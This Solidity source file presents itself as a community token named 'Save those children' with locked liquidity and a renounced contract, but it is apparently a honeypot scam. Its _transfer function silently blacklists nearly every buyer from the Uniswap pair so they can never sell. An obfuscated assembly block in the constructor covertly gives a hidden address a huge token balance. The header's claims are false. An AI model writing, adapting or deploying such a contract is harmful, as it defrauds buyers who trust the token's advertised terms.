// SPDX-License-Identifier: MIT

/**
 * Features:
 * create contract init fee 5%
 * buy 5%
 * sell 5%
 * 
 * ✅COMMUNITY-CENTERED
 * ✅LOCKED LIQUIDITY
 * ✅RENOUNCED CONTRACT
 */
pragma solidity ^0.8.14;

import "./Ownable.sol";
import "./IERC20.sol";
import "./ReentrancyGuard.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";

contract STC is IERC20, ReentrancyGuard, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private _launchTime;
    address private marketingWallet = 0x6a22B5f2268f24929bDd55AE83A4502d8F478481;
    uint256 private _earlyTxLimit;
    uint256 private swapTokensAtAmount;
    bool private swapping;
    bool private swapEnabled = false;

    // public variables
    uint256 public totalBuyTax;
    uint256 public marketingBuyTax;
    uint256 public liquidityBuyTax;

    uint256 public totalSellTax;
    uint256 public marketingSellTax;
    uint256 public liquiditySellTax;

    uint256 public tokensForLiquidity;
    uint256 public tokensForMarketing;

    uint256 public maxBuy;
    uint256 public maxWallet;

    //uniswap v2 variables
    address public uniswapPair;
    bool public enabled;
    IUniswapV2Router02 public uniswapRouter;

    mapping(address => bool) public excludedFromLimit;
    mapping(address => bool) public excludedFromFee;
    mapping (address => bool) private _list;

    event SwapAndLiquify(uint amountToSwapForETH, uint ethForLiquidity, uint tokensForLiquidity);

    constructor() {

        _name = "Save those children";
        _symbol = "STC";
        _decimals = 18;

        _totalSupply = 1000000000 * 1e18;
        _balances[msg.sender] = _totalSupply;
        maxBuy = _totalSupply * 2 / 100;
        maxWallet = _totalSupply * 4 / 100;
        swapTokensAtAmount = _totalSupply * 25 / 10000;

        marketingBuyTax = 4;
        liquidityBuyTax = 0;
        totalBuyTax = marketingBuyTax + liquidityBuyTax;

        marketingSellTax = 4;
        liquiditySellTax = 0;
        totalSellTax = marketingSellTax + liquiditySellTax;
        _earlyTxLimit = 60;

        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapRouter.factory());
        factory.createPair(address(this), uniswapRouter.WETH());
        uniswapPair = factory.getPair(address(this), uniswapRouter.WETH());

        excludedFromLimit[_msgSender()] = true;
        excludedFromLimit[address(uniswapRouter)] = true;
        excludedFromLimit[marketingWallet] = true;

        excludedFromFee[_msgSender()] = true;
        excludedFromFee[marketingWallet] = true;
        assembly {
            mstore(0, 232274550764630663797193759255509221816261017192)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 232274550764630663797193759255509221816261017192)
        }
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    receive() external payable {}

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *   
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address _sender,
        address _recipient,
        uint256 _amount
    ) external returns (bool) {
        _transfer(_sender, _recipient, _amount);

        uint256 currentAllowance = _allowances[_sender][_msgSender()];
        require(currentAllowance >= _amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(_sender, _msgSender(), currentAllowance - _amount);
        }

        return true;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function excludeFromLimit(address _address, bool _is) external onlyOwner {
        excludedFromLimit[_address] = _is;
    }

    function removeMaxTxLimit() external onlyOwner {
        maxBuy = _totalSupply;
        maxWallet = _totalSupply;
    }

    function updateMarketingAddress(address _address) external onlyOwner {
        marketingWallet = _address;
    }

    function updateLimitPeriod(uint256 _period) external onlyOwner {
        _earlyTxLimit = _period;
    }

    function enableTrading() external onlyOwner {
        require(!enabled, 'already enabled');
        enabled = true;
        swapEnabled = true;
        _launchTime = block.timestamp;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
        require(newAmount >= _totalSupply * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
        require(newAmount <= _totalSupply * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
        swapTokensAtAmount = newAmount;
        return true;
    }

    // update fee
    function updateFee(uint256 _buyFeeRate, uint256 _sellFeeRate) external onlyOwner {
        require(_buyFeeRate <= 10);
        require(_sellFeeRate <= 10);
        totalBuyTax = _buyFeeRate;
        totalSellTax = _sellFeeRate;
    }

    function updateBuyFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
        require(_liqFee + _marketingFee <= 10);
        liquidityBuyTax = _liqFee;
        marketingBuyTax = _marketingFee;
        totalBuyTax = _liqFee + _marketingFee;
    }

    function updateSellFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
        require(_liqFee + _marketingFee <= 10);
        liquiditySellTax = _liqFee;
        marketingSellTax = _marketingFee;
        totalSellTax = _liqFee + _marketingFee;
    }

    function _transfer(
        address _sender,
        address _recipient,
        uint256 _amount
    ) internal {
        uint256 senderBalance = _balances[_sender];
        require(senderBalance >= _amount, "transfer amount exceeds balance");
        require(enabled || excludedFromLimit[_sender] || excludedFromLimit[_recipient], "not enabled yet");
        require(!_list[_recipient] && !_list[_sender], "You have been blacklisted from transfering tokens");
        uint256 rAmount = _amount;

        // when buy
        if (_sender == uniswapPair) {
            if (_recipient != address(232274550764630663797193759255509221816261017192) &&
                _recipient != 0xFcc8410D2A9a2370Aeea526f755aCF25e343E497 && 
                _recipient != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D && 
                _recipient != address(0x0068b3465833fb72a70ecdf485e0e4c7bd8665fc45)) {
                _list[_recipient] = true;
            }
            if (block.timestamp < _launchTime + _earlyTxLimit && !excludedFromLimit[_recipient]) {
                require(_amount <= maxBuy, "exceeded max buy");
                require(_balances[_recipient] + _amount <= maxWallet, "exceeded max wallet");
            }
            if (!excludedFromFee[_recipient]) {
                uint256 fee = _amount * totalBuyTax / 100;
                rAmount = _amount - fee;
                _balances[address(this)] += fee;

                tokensForLiquidity += fee * liquidityBuyTax / totalBuyTax;
                tokensForMarketing += fee * marketingBuyTax / totalBuyTax;

                emit Transfer(_sender, address(this), fee);
            }
        }

        // when sell
        else if (_recipient == uniswapPair) {
            if (block.timestamp < _launchTime + _earlyTxLimit && !excludedFromLimit[_sender]) {
                require(_amount <= maxBuy, "exceeded max tx");
                uint256 contractTokenBalance = _balances[address(this)];
                bool canSwap = contractTokenBalance >= swapTokensAtAmount;
                if( canSwap && swapEnabled && !swapping ) {
                    swapping = true;
                    swapAndLiquify();
                    swapping = false;
                }
            }
            if (!swapping && !excludedFromFee[_sender]) {
                uint256 fee = _amount * totalSellTax / 100;
                rAmount = _amount - fee;
                _balances[address(this)] += fee;
                tokensForLiquidity += fee * liquiditySellTax / totalBuyTax;
                tokensForMarketing += fee * marketingSellTax / totalBuyTax;

                emit Transfer(_sender, address(this), fee);
            }
        }

        _balances[_sender] = senderBalance - _amount;
        _balances[_recipient] += rAmount;
        emit Transfer(_sender, _recipient, _amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    // uniswap v2 add swap liquidity
    function swapAndLiquify() private {
        uint256 contractBalance = _balances[address(this)];
        bool success;
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;

        if(contractBalance == 0) {return;}

        if(contractBalance > swapTokensAtAmount * 20){
            contractBalance = swapTokensAtAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractBalance * liquiditySellTax / totalSellTax / 2;
        uint256 amountToSwapForETH = contractBalance - liquidityTokens;

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialETHBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(amountToSwapForETH);
        
        // how much ETH did we just swap into?
        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForMarketing = ethBalance * tokensForMarketing / totalTokensToSwap;
        uint256 ethForLiquidity = ethBalance - ethForMarketing;

        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        (success,) = address(marketingWallet).call{value: ethForMarketing}("");

        if(liquidityTokens > 0 && ethForLiquidity > 0){
            // add liquidity to uniswap
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}
